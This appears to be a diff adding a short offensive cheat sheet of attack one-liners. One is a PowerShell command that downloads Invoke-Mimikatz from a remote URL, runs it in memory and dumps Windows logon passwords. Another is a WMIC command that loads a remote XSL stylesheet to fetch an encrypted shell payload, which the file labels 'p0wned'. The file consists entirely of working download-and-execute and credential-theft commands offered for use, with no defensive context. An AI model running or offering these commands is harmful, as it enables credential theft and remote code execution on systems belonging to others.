@@ -1,0 +1,9 @@
+Powershell:
+Powershell.Exe -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('Https://Raw.Githubusercontent.Com/EmpireProject/Empire/7a39a55f1
+7b1aeb951b3d9d80c6dc64500cacb5/Data/Module_source/Credentials/Invoke-Mimikatz.Ps1')); Invoke-Mimikatz -Command 'Privilege::Debug Sekurlsa::Logonpasswords Exit'
+
+.DotNet:
+C:\Windows\System32\wbem\WMIC.exe os get /format:"https://raw.githubusercontent.com/rasta-mouse/p0wnedLoader/master/p0wnedLoader.xsl"
+https://raw.githubusercontent.com/Cn33liz/p0wnedLoader/master/p0wnedShellx64.enc
+GotP0wned!
+
